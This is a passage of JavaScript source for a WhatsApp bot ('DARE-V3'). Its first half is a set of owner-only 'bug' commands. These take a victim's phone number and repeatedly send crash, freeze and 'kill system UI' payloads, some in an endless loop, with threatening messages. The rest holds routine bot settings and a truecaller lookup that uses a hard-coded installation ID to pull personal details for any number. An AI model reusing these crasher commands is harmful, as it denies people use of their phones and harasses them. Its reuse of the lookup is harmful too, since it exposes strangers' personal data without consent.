reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 30; i++) {
await freezeui(target, true)
await freezeuii(target, true)
await nulltag(target, true)
await Bug1(target, Null)
await Bug2(target, Null)
await InfiNite(target, cct = true, ptcp = true)
await InfiNite(target, cct = true, ptcp = true)
await InfiNite(target, cct = true, ptcp = true)
}
reply("TARGET CRASHED")
}
case 'xbug': 

if (!DareTheCreator) return reply("NO ACCESS")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 234×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; ; i++) {
await func1(target);
await ngeloc(target);
await killui(target);
await func1(target);
await ngeloc(target);
await killui(target);
await func1(target);
await ngeloc(target);
await killui(target);
await DocBug(target)
}
break
case 'virailixcrash': 

     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: Freeze Bug
© viralix 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Freeze Bug
 `)
 break
case 'byypas': 

     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: NewBug
© viralix
 `)
     for (let i = 0; i < 9; i++) {
    await CallMsg(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: NewBug
 `)
 break
 case 'clearbugs': {
 

if (!DareTheCreator) return reply("NO ACCESS")
if (!q) return m.reply(`Example:\n ${prefix + command} 234xxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Dare.sendMessage(BapakLuWkwk, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("Done Clear Bug ")
}
break 
 case 'virailixfreeze': 
 
     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: Freeze Bug
© viralix
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Freeze Bug
 `)
 break
 case '🔥': 
 
     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: 🔥
© viralix
 `)
     for (let i = 0; i < 9; i++) {
    await CaroUsel(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: ❤️‍🔥
 `)
 break
 case 'hardbug': 
 
     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: hardbug
© virailix 
 `)
     for (let i = 0; i < 9; i++) {
    await XeonXRobust(zLoc, ptcp = true)
    await xeonHARD(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
    await newsLetter(zLoc, ptcp = true)   
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: hardbug
 `)
 break
 case '😈': 
 
     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: 😈
© viralix
 `)
     for (let i = 0; i < 10; i++) {
    await Gsz(zLoc, Ptcp = true)
    await xPokers(zLoc, Ptcp = true)
    await uidoc2(zLoc, ptcp = false)
    await freezefile(zLoc, ptcp = false)
    await CaroUsel(zLoc, ptcp = false)
    await NullX(zLoc, ptcp = false)
    await Vulcanicx(zLoc, ptcp = false)
    await xTravas(zLoc, ptcp = false)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: 😈
 `)
 break
case '🦅': 

     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: 🦅
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: 🦅
 `)
 case 'killsystemui':
 
     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Blank System Ui
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Blank System Ui
 `)
 break
 case 'blankwhatsapp': 
 
     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Blank System Ui
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Blank System Ui
 `)
 break
case 'mediumbug':
 

if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: mediumbug
 `)
     for (let i = 0; i < 5; i++) {
    await SletterCrash(zLoc, ptcp = true)
    await freezefile(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: mediumbug
 `)
 break
case 'combobug':

     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Bug Combo 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await IosPayM(zLoc, ptcp = true)
    await IosStanza(zLoc, ptcp = true)
    await IosCL(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await locasiV2(zLoc, ptcp = true)
    await TanggapanDiterima(zLoc, ptcp = true)
    await VPen(zLoc, ptcp = true)
    await BlankInvite(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
    await documentfreeze2(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Bug Combo
 `)
 break
 case 'iphonecrasher': 
 
 
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: iPhone Bug
 `)
     for (let i = 0; i < 2; i++) {
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: iPhone Bug
 `)
 break
 case 'lockios':
 

if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: iPhone Bug
 `)
     for (let i = 0; i < 2; i++) {
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: iPhone Bug
 `)
 break
 case 'killaccess': 
 

if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Kill iPhone Access
 `)
     for (let i = 0; i < 5; i++) {
    await IosPayM(zLoc, ptcp = true)
    await IosStanza(zLoc, ptcp = true)
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Kill iPhone Access
 `)
 break
 case 'locationbug': 
 
     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Location Bug
 `)
     for (let i = 0; i < 9; i++) {
    await liveLokFreeze(zLoc, ptcp = true)
    await locasiV2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Location Bug
 `)
 break
 case 'documentbug': 
 
     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Document Bug
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await documentfreeze2(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Document Bug
 `)
 break
case 'pairing':     
if (!DareTheCreator) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: pairing
 `)
     for (let i = 0; i < 9; i++) {
    await SendPairing(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: pairing
 `)
break
//End of bug commands

case 'sad': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `🥺`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > HEY @${sender.split("@")[0]}    
   ɪᴍ ᴀʟʀᴇᴀᴅʏ ʙʀᴏᴋᴇɴ 🙂⛈`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/jlu16i.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

case 'motivate': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `☠️`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > HELLO @${sender.split("@")[0]}    
   𝘈𝘊𝘊𝘌𝘗𝘛 𝘐𝘛 𝘈𝘓𝘓 😈💀`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/u1k4hx.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

case 'leave': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `🩸`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > HEY @${sender.split("@")[0]}    
   𝐉𝐔𝐒𝐓 𝐋𝐄𝐀𝐕𝐄 𝐌𝐄 𝐀𝐋𝐎𝐍𝐄 🥺 𝐢𝐭𝐬 𝐮𝐧𝐛𝐞𝐚𝐫𝐚𝐛𝐥𝐞 💔`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/trc76u.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

              case 'statustext': 
              case 'upswtext':
              case 'upswteks': {
                 if (!DareTheCreator) return reply(mess.only.owner)
                 if (!q) return replydare('Text?')
                 await Dare.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.users) })
                 replydare('done')
              }
              break
              case 'statusvideo':
              case 'upswvideo': {
                 if (!DareTheCreator) return reply(mess.only.owner)
                 if (/video/.test(mime)) {
                    var videosw = await Dare.downloadAndSaveMediaMessage(quoted)
                    await Dare.sendMessage('status@broadcast', {
                       video: {
                          url: videosw
                       },
                       caption: q ? q : ''
                    }, { statusJidList: Object.keys(global.db.users) })
                    await replydare('done')
                 } else {
                    replydare('Reply to video')
                 }
              }
              break
              case 'statusimg':
              case 'statusimage':
              case 'upswimg': {
                 if (!DareTheCreator) return reply(mess.only.owner)
                 if (/image/.test(mime)) {
                    var imagesw = await Dare.downloadAndSaveMediaMessage(quoted)
                    await Dare.sendMessage('status@broadcast', {
                       image: {
                          url: imagesw
                       },
                       caption: q ? q : ''
                    }, { statusJidList: Object.keys(global.db.users)})
                    await replydare('done')
                 } else {
                    replydare('Reply to image')
                 }
              }
              break
              case 'statusaudio':
              case 'upswaudio': {
                 if (!DareTheCreator) return reply(mess.only.owner)
                 if (/audio/.test(mime)) {
                    var audiosw = await Dare.downloadAndSaveMediaMessage(quoted)
                    await Dare.sendMessage('status@broadcast', {
                       audio: {
                          url: audiosw
                       },
                       mimetype: 'audio/mp4',
                       ptt: true
                    }, {
                       backgroundColor: '#FF000000',
                       statusJidList: Object.keys(global.db.users)
                    })
                    await replydare('done')
                 } else {
                    replydare('Reply to audio')
                 }
              }
              break
              case 'autoswview':
  case 'autostatusview':
      if (!DareTheCreator) return reply(mess.only.owner)
      if (args[0] === 'on') {
          db.settings[botNumber].antiswview = true;
          replydare(`${command} is enabled`);
      } else if (args[0] === 'off') {
          db.settings[botNumber].antiswview = false;
          replydare(`${command} is disabled`);
      } else {
          return replydare(`
              Please choose an option to enable or disable ${command}.
  
              Usage:
              - ${prefix + command} on  : Enable ${command}
              - ${prefix + command} off : Disable ${command}
  
              Example: ${prefix + command} on
          `);
      }
      break;
  
  case 'pickupline': {
  try {
      // Fetch the pickup line from the API
      let res = await fetch(`https://api.popcat.xyz/pickuplines`);
      if (!res.ok) {
          throw new Error(`API request failed with status ${res.status}`);
      }
      
      let json = await res.json();
      let pickupLine = `*Here's a pickup line for you 😘💖:*\n\n${json.pickupline} 😂❤️`;

      // Image URL to use
      const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

     
      // Send the message with the image, caption, and footer
      await Dare.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: pickupLine,
          footer: 'DARE-V3'
      });
  } catch (error) {
      console.error('Error in pickupline command:', error);
      replydare('Failed to fetch a pickup line. Please try again later.');
  }
}
break;
  case 'autorecordtype':
      if (!DareTheCreator) return reply(mess.only.owner)
      if (q === 'on') {
          db.settings[botNumber].autorecordtype = true;
          replydare(`Successfully changed Auto-RecordingTyping to ${q}`);
      } else if (q === 'off') {
          db.settings[botNumber].autorecordtype = false;
          replydare(`Successfully changed Auto-RecordingTyping to ${q}`);
      } else {
          return replydare(`
              Please choose an option to enable or disable ${command}.
  
              Usage:
              - ${prefix + command} on  : Enable Auto-RecordingTyping
              - ${prefix + command} off : Disable Auto-RecordingTyping
  
              Example: ${prefix + command} on
          `);
      }
      break;
  
  case 'autorecord':
      if (!DareTheCreator) return reply(mess.only.owner)
      if (q === 'on') {
          db.settings[botNumber].autorecord = true;
          replydare(`Successfully changed Auto-Recording to ${q}`);
      } else if (q === 'off') {
          db.settings[botNumber].autorecord = false;
          replydare(`Successfully changed Auto-Recording to ${q}`);
      } else {
          return replydare(`
              Please choose an option to enable or disable ${command}.
  
              Usage:
              - ${prefix + command} on  : Enable Auto-Recording
              - ${prefix + command} off : Disable Auto-Recording
  
              Example: ${prefix + command} on
          `);
      }
      break;
  
          
  case 'autotype':
      if (!DareTheCreator) return reply(mess.only.owner)
  
      if (q === 'on') {
          db.settings[botNumber].autotype = true;
          return replydare(`Successfully changed Auto-Typing to ${q}`);
      } else if (q === 'off') {
          db.settings[botNumber].autotype = false;
          return replydare(`Successfully changed Auto-Typing to ${q}`);
      } else {
          return replydare(`
              Please choose an option to enable or disable ${command}.
  
              Usage:
              - ${prefix + command} on  : Enable Auto-Typing
              - ${prefix + command} off : Disable Auto-Typing
  
              Example: ${prefix + command} on
          `);
      }
      break;
  
  case 'antidelete': {
    if (!DareTheCreator) return reply(mess.only.owner);

    if (text === 'on') {
        if (db.settings[m.chat]?.antidelete) return replydare('*Anti Delete is already active!*');
        
        // Initialize the settings for the private chat if not already present
        if (!db.settings[m.chat]) db.settings[m.chat] = {};
        
        db.settings[m.chat].antidelete = true;
        replydare('*Anti Delete Activated for this private chat!*');
    } else if (text === 'off') {
        if (!db.settings[m.chat]?.antidelete) return replydare('*Anti Delete is already disabled!*');
        
        db.settings[m.chat].antidelete = false;
        replydare('*Anti Delete Disabled for this private chat!*');
    } else {
        return replydare(`
            Please choose an option to enable or disable Anti-Delete.

            Usage:
            - ${prefix + command} on  : Enable Anti-Delete
            - ${prefix + command} off : Disable Anti-Delete

            Example: ${prefix + command} on
        `);
    }
}
break;
  
  case 'autoread':
      if (!DareTheCreator) return reply(mess.only.owner)
  
      if (q === 'on') {
          db.settings[botNumber].autoread = true;
          return replydare(`Successfully changed Auto-Read to ${q}`);
      } else if (q === 'off') {
          db.settings[botNumber].autoread = false;
          return replydare(`Successfully changed Auto-Read to ${q}`);
      } else {
          return replydare(`
              Please choose an option to enable or disable ${command}.
  
              Usage:
              - ${prefix + command} on  : Enable Auto-Read
              - ${prefix + command} off : Disable Auto-Read
  
              Example: ${prefix + command} on
          `);
      }
      break; 
      
          case 'unavailable': {
      if (!DareTheCreator) return reply(mess.only.owner)
  
      if (q === 'on') {
          db.settings[botNumber].online = true;
          replydare(`Successfully changed unavailable to ${q}`);
      } else if (q === 'off') {
          db.settings[botNumber].online = false;
          replydare(`Successfully changed unavailable to ${q}`);
      } else {
          replydare(`Please use *${prefix + command} on* to enable and *${prefix + command} off* to disable.`);
      }
  }
  break;
  case 'autobio':
    if (!DareTheCreator) return reply(mess.only.owner)

    if (q == 'on') {
        db.settings[botNumber].autobio = true;
        return replydare(`Successfully changed AutoBio to ${q}`);
    } else if (q == 'off') {
        db.settings[botNumber].autobio = false;
        return replydare(`Successfully changed AutoBio to ${q}`);
    } else {
        return replydare(`
            Please choose an option to enable or disable ${command}.

            Usage:
            - ${prefix + command} on  : Enable AutoBio
            - ${prefix + command} off : Disable AutoBio

            Example: ${prefix + command} on
        `);
    }
    break;
    
      case 'setprefix':
    if (!DareTheCreator) return reply(mess.only.owner)
    if (!text) return replydare(`Example : ${prefix + command} #`)
    global.xprefix = text
    replydare(`Prefix successfully changed to ${text}`)
    break

case 'truecaller': {
  let phoneNumber = '';

  // Determine the phone number from text, quoted message, or mentioned user
  if (text) {
    phoneNumber = text.replace(/[^0-9]/g, '');
  } else if (m.quoted) {
    phoneNumber = m.quoted.sender.replace(/[^0-9]/g, '');
  } else if (m.mentionedJid && m.mentionedJid[0]) {
    phoneNumber = m.mentionedJid[0].replace(/[^0-9]/g, '');
  } else {
    return await Dare.sendText(m.chat, "Please provide a number in international format without +, quote a user, or mention a user.");
  }

  try {
    const installationId = 'a1i0Z--jzbJC6kx-2_s3OMNW2X7O2Qe3ca-XwmHexijCBA6MNKAO2ciUw756zhWj';
    const apiUrl = `https://truecaller-api.vercel.app/search?phone=${encodeURIComponent(phoneNumber)}&id=${installationId}`;

    let response = await fetch(apiUrl);
    if (!response.ok) {
      throw new Error(`API request failed with status ${response.status}`);
    }

    let json = await response.json();
    json.creator = 'DARE'; // Change creator to Dare

    let details = '';
    for (let prop in json) {
      if (prop === 'flagURL') continue;

      if (prop === 'addresses') {
        details += `⚝ *${prop}:*\n`;
        for (let addressProp in json[prop][0]) {
          details += `  ⚝ *${addressProp}:* ${json[prop][0][addressProp]}\n`;
        }
      } else if (prop === 'countryDetails') {
        details += `⚝ *${prop}:*\n`;
        for (let countryProp in json[prop]) {
          if (Array.isArray(json[prop][countryProp])) {
            details += `  ⚝ *${countryProp}:* ${json[prop][countryProp].join(', ')}\n`;
          } else {
            details += `  ⚝ *${countryProp}:* ${json[prop][countryProp]}\n`;
          }
        }
      } else {
        if (prop !== 'flagURL') {
          details += `⚝ *${prop}:* ${json[prop]}\n`;
        }
      }
    }

    // Send the details message with an image link
    const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

    await Dare.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: details,
      mentions: [m.sender]
    });

  } catch (error) {
    console.error('API Fetch Error:', error);
    return await Dare.sendText(m.chat, "An error occurred while fetching the phone details. Please try again.");
  }
}
break;

	case 'settings': {
    if (!DareTheCreator) {
        // Show the current settings
        let settingsBot = Object.entries(db.settings[botNumber]).map(([key, value]) => {
            let qhk = (typeof value === 'boolean') ? (value ? '✅ On' : '❌ Off') : value;
            return `*${key.charAt(0).toUpperCase() + key.slice(1)}*: ${qhk}`;
